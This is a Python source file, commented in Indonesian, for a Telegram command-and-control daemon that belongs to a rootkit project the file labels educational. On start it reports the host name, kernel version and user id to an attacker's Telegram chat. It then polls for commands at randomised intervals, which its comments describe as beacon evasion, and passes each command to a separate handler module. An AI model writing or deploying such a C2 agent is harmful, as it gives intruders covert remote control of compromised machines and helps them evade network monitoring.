#!/usr/bin/env python3
"""
daemon.py — agent kontrol Telegram untuk unified-rootkit (edukasi).

Cara pakai:
    cp config.example.ini config.ini      # isi TELEGRAM_TOKEN + TELEGRAM_CHAT_ID
    python3 control/telegram/daemon.py

Perilaku (kontrak lengkap: SPEC.md):
    - kirim pesan "online" saat start (bukti hidup)
    - polling getUpdates: POLL_INTERVAL + acak RAND_JITTER (anti-beacon)
    - HANYA mematuhi perintah dari TELEGRAM_CHAT_ID — lainnya DIAM total
    - token tidak pernah dicetak ke log mana pun
"""
import json
import os
import random
import sys
import time
import types
import urllib.error
import urllib.parse
import urllib.request

# ---- layout repo: config.ini & control/cli ada di ROOT ----
HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.abspath(os.path.join(HERE, "..", ".."))
CONFIG_PATH = os.path.join(ROOT, "config.ini")
CLI_PATH = os.path.join(ROOT, "control", "cli", "rkit")

NET_TIMEOUT = 30      # batas semua panggilan jaringan (detik)
POLL_TIMEOUT = 25     # long-poll server Telegram
BACKOFF = 60          # jeda saat poll gagal

import commands       # handler perintah (satu folder)


def load_config():
    if not os.path.exists(CONFIG_PATH):
        print("[!] config.ini tidak ada — salin dulu:\n"
              "    cp config.example.ini config.ini", file=sys.stderr)
        sys.exit(1)

    cfg = {}
    with open(CONFIG_PATH, encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            k, v = line.split("=", 1)
            cfg[k.strip()] = v.strip()

    token = cfg.get("TELEGRAM_TOKEN", "")
    if not token or token.startswith("LETAKKAN"):
        print("[!] TELEGRAM_TOKEN masih placeholder — isi dulu "
              "(lihat config.example.ini)", file=sys.stderr)
        sys.exit(1)

    try:
        chat_id = int(cfg.get("TELEGRAM_CHAT_ID", "0") or "0")
    except ValueError:
        chat_id = 0
    if chat_id == 0:
        print("[!] TELEGRAM_CHAT_ID wajib diisi (tanya @userinfobot)",
              file=sys.stderr)
        sys.exit(1)

    try:
        interval = max(60, int(cfg.get("POLL_INTERVAL", "3600") or "3600"))
        jitter = max(0, int(cfg.get("RAND_JITTER", "600") or "600"))
    except ValueError:
        interval, jitter = 3600, 600

    return types.SimpleNamespace(
        token=token,
        chat_id=chat_id,
        mode=cfg.get("CONTROL_MODE", "cli"),
        interval=interval,
        jitter=jitter,
        cli_path=cfg.get("CLI_PATH", CLI_PATH),
        raw=cfg,
    )


def api(method, params, token):
    """POST JSON ke bot API. Timeout selalu NET_TIMEOUT."""
    url = "https://api.telegram.org/bot%s/%s" % (token, method)
    req = urllib.request.Request(
        url, data=json.dumps(params).encode(),
        headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=NET_TIMEOUT) as r:
        return json.loads(r.read().decode("utf-8"))


def send(token, chat_id, text):
    try:
        api("sendMessage", {"chat_id": chat_id, "text": text}, token)
    except Exception as e:
        # jangan pernah ikut mencetak isi pesan/token — cukup tipe galanya
        print("[!] kirim gagal: %s" % type(e).__name__, file=sys.stderr)


def poll(token, offset):
    url = ("https://api.telegram.org/bot%s/getUpdates?timeout=%d&offset=%d"
           % (token, POLL_TIMEOUT, offset))
    with urllib.request.urlopen(url, timeout=NET_TIMEOUT) as r:
        data = json.loads(r.read().decode("utf-8"))
    return data.get("result", [])


def authorize(msg, cfg):
    """GERBANG KEAMANAN — dipanggil SEBELUM dispatch (lihat SPEC §4)."""
    try:
        return (msg["from"]["id"] == cfg.chat_id and
                msg["chat"]["id"] == cfg.chat_id)
    except (KeyError, TypeError):
        return False


def main():
    cfg = load_config()

    import platform
    import socket
    try:
        host = socket.gethostname()
    except Exception:
        host = "unknown"
    send(cfg.token, cfg.chat_id,
         "✅ online | host=%s | kernel=%s | uid=%d | mode=%s"
         % (host, platform.release(), os.getuid(), cfg.mode))

    ctx = types.SimpleNamespace(
        cfg=cfg, sleep_until=0.0, last_exec=0.0, exec_times=[],
        should_exit=False,
    )

    offset = 0
    while True:
        if ctx.should_exit:
            print("[i] berhenti atas permintaan perintah /uninstall")
            return

        if time.time() < ctx.sleep_until:
            time.sleep(1)
            continue

        try:
            updates = poll(cfg.token, offset)
        except Exception as e:
            print("[!] poll gagal: %s — coba lagi %ds" % (type(e).__name__, BACKOFF),
                  file=sys.stderr)
            time.sleep(BACKOFF)
            continue

        for u in updates:
            offset = u["update_id"] + 1
            msg = u.get("message") or u.get("edited_message")
            if not msg:
                continue
            if not authorize(msg, cfg):
                continue          # chat lain → DIAM, jangan dibalas
            text = (msg.get("text") or "").strip()
            if not text.startswith("/"):
                continue
            try:
                reply = commands.dispatch(text, ctx)
            except Exception as e:
                reply = "❌ internal error (%s)" % type(e).__name__
            send(cfg.token, cfg.chat_id, reply)

        # jeda berikutnya = POLL_INTERVAL + acak(0..jitter)
        time.sleep(cfg.interval + random.randint(0, cfg.jitter))


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[i] berhenti manual")
